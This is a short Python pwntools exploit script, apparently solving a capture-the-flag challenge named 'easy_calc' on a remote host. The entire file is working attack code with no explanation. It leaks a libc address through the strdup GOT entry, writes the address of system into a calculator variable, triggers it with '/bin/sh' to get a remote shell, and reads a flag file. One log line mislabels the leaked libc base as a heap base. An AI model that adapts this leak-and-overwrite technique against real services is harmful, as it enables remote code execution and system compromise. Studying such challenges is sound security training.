from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#r = process('./easy_calc')
r = remote('106.10.34.139', 20003)

strdup_got = 0x6020B8

r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', '1')
r.sendafter(': ', 'int')
r.sendafter(': ', str(strdup_got))
r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', '2')
r.sendafter(': ', 'string')
r.sendafter(': ', 'leak: ')
r.sendlineafter('>> ', '2')
r.sendafter(': ', 'string')
r.sendafter(': ', 'int')
r.sendafter(': ', '+')
r.sendafter(': ', 'libc leak')

r.sendlineafter('>> ', '3')
r.sendafter(': ', 'libc leak')
r.recvuntil('leak: ')
libc.address = u64(r.recvline()[:-1].ljust(8, '\x00')) - libc.symbols['strdup']
log.info('HEAP BASE: 0x{:016x}'.format(libc.address))

system = libc.symbols['system']
r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', '2')
r.sendafter(': ', 'system')
r.sendafter(': ', p64(system))
r.sendlineafter('>> ', '2')
r.sendafter(': ', 'system')
r.sendafter(': ', 'int')
r.sendafter(': ', '=')

r.sendlineafter('>> ', '1')
r.sendlineafter('>> ', '2')
r.sendafter(': ', 'get shell')
r.sendafter(': ', '/bin/sh\x00')

r.sendline('cat flag2.txt')

r.interactive()
